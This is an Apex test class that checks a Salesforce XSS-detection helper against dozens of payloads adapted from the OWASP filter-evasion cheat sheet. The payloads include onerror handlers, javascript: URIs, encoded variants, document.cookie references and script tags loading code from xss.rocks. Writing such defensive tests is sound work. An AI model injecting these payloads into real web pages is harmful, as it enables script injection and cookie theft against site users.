/**
* Created/Modified By   :  Mahesh (Girikon)
* Created On:           :  June 11 2019
* @description          : [This test class covers the apex class : XssSecurityHelper]
* Modification log --
* Modified By           :
**/
@isTest
public class XssSecurityHelperTest {
    
    public static void setupSettings(Boolean settingsOn){
        //  insert new esso_Application_Security_Settings__c(Enable_Xss_Input_Detection__c = settingsOn, Enable_Return_URL_Whitelist_Check__c = settingsOn, Enable_Xss_Parameter_Detection__c = settingsOn);
        esso_Configuration.setting.Enable_Xss_Input_Detection__c = settingsOn;
        esso_Configuration.setting.Enable_Return_URL_Whitelist_Check__c = settingsOn;
        esso_Configuration.setting.Enable_Xss_Parameter_Detection__c = settingsOn;
        
        esso_Configuration.setting = esso_Configuration.setting;
        
    }
    
    @testSetup static void setup()
    {
        esso_ConfigurationTest.setupData();
    }
    
    @isTest static void test_isXssVulnerable() {
        
        setupSettings(true);
        
        String xssTestStr;
        
        xssTestStr = 'basic string';
        System.assertEquals(false, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return false');
        //System.assertEquals('basic string', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = '<img onerror="alert(1)"/>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr),'The value should be match');
        
        xssTestStr = 'some text <img onerror="alert(1)"/>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('some text', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = 'some text <img onerror="alert(1)"/>some more text';
        //System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr));
        //System.assertEquals('some text some more text', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = '.<img onerror="alert(1)"/>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('.', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = '_<img onerror="alert(1)"/>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('_', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = '.<img onerror=\'alert(1)\'/>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
       // System.assertEquals('.', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = '.<img onerror="alert(1)>"/>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('.', XssSecurityHelper.getXssCleanString(xssTestStr)); ///////////////////////// TO FIX
        
        xssTestStr = '<a href="#" onclick="javascript">link</a>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('link', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = '<br>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = '<br/>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = 'javascript>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = 'JavaScript"/>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = 'param=JavaScript:';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('param=', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = '"><script>test</script>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('">', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        
        // ***** XSS Tests based on - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet ***** //
        
        // Basic XSS Test Without Filter Evasion
        xssTestStr = '<SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // XSS Locator (Polygot)
        xssTestStr = 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('/*-->', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Image XSS using the JavaScript directive
        xssTestStr = '<IMG SRC="javascript:alert(\'XSS\');">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // No quotes and no semicolon
        xssTestStr = '<IMG SRC=javascript:alert(\'XSS\')>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Case insensitive XSS attack vector
        xssTestStr = '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // HTML entities
        xssTestStr = '<IMG SRC=javascript:alert("XSS")>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Grave accent obfuscation
        xssTestStr = '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Malformed A tags - 1
        xssTestStr = '<a onmouseover="alert(document.cookie)">xxs link</a>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('xxs link', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Malformed A tags - 2
        xssTestStr = '<a onmouseover=alert(document.cookie)>xxs link</a>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('xxs link', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Malformed IMG tags
        xssTestStr = '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // fromCharCode
        xssTestStr = '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Default SRC tag to get past filters that check SRC domain
        xssTestStr = '<IMG SRC=# onmouseover="alert(\'xxs\')">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Default SRC tag by leaving it empty
        xssTestStr = '<IMG SRC= onmouseover="alert(\'xxs\')">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Default SRC tag by leaving it out entirely
        xssTestStr = '<IMG onmouseover="alert(\'xxs\')">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // On error alert
        xssTestStr = '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // IMG onerror and javascript alert encode
        xssTestStr = '<img src=x onerror="javascript:alert("XSS")">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Decimal HTML character references
        xssTestStr = '<IMG SRC=javascript:alert("XSS")>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Decimal HTML character references without trailing semicolons
        xssTestStr = '<IMG SRC=javascript:alert("XSS")>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Hexadecimal HTML character references without trailing semicolons
        xssTestStr = '<IMG SRC=javascript:alert("XSS")>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Embedded tab
        xssTestStr = '<IMG SRC="jav  ascript:alert(\'XSS\');">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Embedded Encoded tab
        xssTestStr = '<IMG SRC="jav  ascript:alert(\'XSS\');">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Embedded newline to break up XSS
        xssTestStr = '<IMG SRC="javascript:alert(\'XSS\');">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Embedded carriage return to break up XSS
        xssTestStr = '<IMG SRC="javascript:alert(\'XSS\');">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Null breaks up JavaScript directive
        xssTestStr = 'perl -e \'print "<IMG SRC=java\\0script:alert(\"XSS\")>";\' > out';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('perl -e \'print "";\' > out', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Spaces and meta chars before the JavaScript in images for XSS
        xssTestStr = '<IMG SRC="   javascript:alert(\'XSS\');">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Non-alpha-non-digit XSS - 1
        xssTestStr = '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Non-alpha-non-digit XSS - 2
        xssTestStr = '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Non-alpha-non-digit XSS - 3
        xssTestStr = '<SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Extraneous open brackets
        xssTestStr = '<<SCRIPT>alert("XSS");//<</SCRIPT>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // No closing script tags
        xssTestStr = '<SCRIPT SRC=http://xss.rocks/xss.js?< B >';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Protocol resolution in script tags
        xssTestStr = '<SCRIPT SRC=//xss.rocks/.j>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Half open HTML/JavaScript XSS vector
        xssTestStr = '<IMG SRC="javascript:alert(\'XSS\')"';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Double open angle brackets
        xssTestStr = '<iframe src=http://xss.rocks/scriptlet.html <';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Escaping JavaScript escapes
        xssTestStr = '</script><script>alert(\'XSS\');</script>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // End title tag
        xssTestStr = '</TITLE><SCRIPT>alert("XSS");</SCRIPT>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // INPUT image
        xssTestStr = '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // BODY image
        xssTestStr = '<BODY BACKGROUND="javascript:alert(\'XSS\')">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // IMG Dynsrc
        xssTestStr = '<IMG DYNSRC="javascript:alert(\'XSS\')">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // IMG lowsrc
        xssTestStr = '<IMG LOWSRC="javascript:alert(\'XSS\')">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // List-style-image
        xssTestStr = '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('li {list-style-image: url("alert(\'XSS\')");}XSS', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // VBscript in an image
        xssTestStr = '<IMG SRC=\'vbscript:msgbox("XSS")\'>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Livescript (older versions of Netscape only)
        xssTestStr = '<IMG SRC="livescript:[code]">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // SVG object tag
        xssTestStr = '<svg/onload=alert(\'XSS\')>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // BODY tag
        xssTestStr = '<BODY ONLOAD=alert(\'XSS\')>';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // BGSOUND
        xssTestStr = '<BGSOUND SRC="javascript:alert(\'XSS\');">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // & JavaScript includes
        xssTestStr = '<BR SIZE="&{alert(\'XSS\')}">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // STYLE sheet
        xssTestStr = '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        // Remote style sheet
        xssTestStr = '<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">';
        System.assertEquals(true, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return true');
        //System.assertEquals('', XssSecurityHelper.getXssCleanString(xssTestStr));
    }
    
    @isTest static void test_Disabled_Settings_isXssVulnerable() {
        
        // Settings are disabled meaning xss values are not detected
        setupSettings(false);
        
        String xssTestStr;
        
        xssTestStr = 'basic string';
        System.assertEquals(false, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return false');
        //System.assertEquals('basic string', XssSecurityHelper.getXssCleanString(xssTestStr));
        
        xssTestStr = '<img onerror="alert(1)"/>';
        System.assertEquals(false, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return false');
        //System.assertEquals('<img onerror="alert(1)"/>', XssSecurityHelper.getXssCleanString(xssTestStr));
    }
    
    
    
    @isTest static void test_SObjectXssDataResult_Xss_Enabled() {
        
        setupSettings(true);
        
        // Instantiate contact with fields populated with Xss values
        Contact theContact = new Contact(Firstname = '<img onerror="xss(firstname)"/>', Lastname = '<img onerror="xss(lastanme)"/>',  Email = 'safe@email.com');
        
        // Now process all contact fields
        XssSecurityHelper.SObjectXssDataResult xssResult = new XssSecurityHelper.SObjectXssDataResult(theContact);
        
        // If inputs contains Xss Vulnerabilities throw an error
        System.assertEquals(true, xssResult.hasXssVulnerability,'The value should be return true');
        System.assertEquals(new List<String> {'FirstName', 'LastName'}, xssResult.xssMatchingFieldAPINames,'The value should be return true');
        System.assertEquals(new List<String> {'First Name', 'Last Name'}, xssResult.getXssMatchingFieldLabels(),'The value should be return true');
       // System.assertEquals('First Name,Last Name', xssResult.getXssMatchingFieldLabelsToString());
    }
    
    @isTest static void test_SObjectXssDataResult_Xss_Disabled() {
        
        setupSettings(false);
        
        // Instantiate contact with fields populated with Xss values
        Contact theContact = new Contact(Firstname = '<img onerror="xss(firstname)"/>', Lastname = '<img onerror="xss(lastanme)"/>',  Email = 'safe@email.com');
        
        // Now process all contact fields
        XssSecurityHelper.SObjectXssDataResult xssResult = new XssSecurityHelper.SObjectXssDataResult(theContact);
        
        // If inputs contains Xss Vulnerabilities throw an error
        System.assertEquals(false, xssResult.hasXssVulnerability,'The value should be return false');
        System.assertEquals(null, xssResult.xssMatchingFieldAPINames,'The value should be return null');
        System.assertEquals(null, xssResult.getXssMatchingFieldLabels(),'The value should be return null');
        System.assertEquals(null, xssResult.getXssMatchingFieldLabelsToString(),'The value should be return null');
    }
    /*
@isTest static void test_SObjectXssDataResult_Xss_No_Settings() {

// No settings are setup meaning xss values are not detected default is not enabled

// Instantiate contact with fields populated with Xss values
Contact theContact = new Contact(Firstname = '<img onerror="xss(firstname)"/>', Lastname = '<img onerror="xss(lastanme)"/>',  Email = 'safe@email.com');

// Now process all contact fields
XssSecurityHelper.SObjectXssDataResult xssResult = new XssSecurityHelper.SObjectXssDataResult(theContact);

// If inputs contains Xss Vulnerabilities throw an error
System.assertEquals(false, xssResult.hasXssVulnerability,'The value should be return false');
System.assertEquals(null, xssResult.xssMatchingFieldAPINames,'The value should be return null');
System.assertEquals(null, xssResult.getXssMatchingFieldLabels(),'The value should be return null');
System.assertEquals(null, xssResult.getXssMatchingFieldLabelsToString(),'The value should be return null');
}

@isTest static void test_No_Settings_isXssVulnerable() {

// No settings are setup meaning xss values are not detected default is not enabled

String xssTestStr;

xssTestStr = 'basic string';
System.assertEquals(false, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return false');
System.assertEquals('basic string', XssSecurityHelper.getXssCleanString(xssTestStr));

xssTestStr = '<img onerror="alert(1)"/>';
System.assertEquals(false, XssSecurityHelper.isXssVulnerable(xssTestStr),'The value should be return false');
System.assertEquals('<img onerror="alert(1)"/>', XssSecurityHelper.getXssCleanString(xssTestStr));
}
*/
}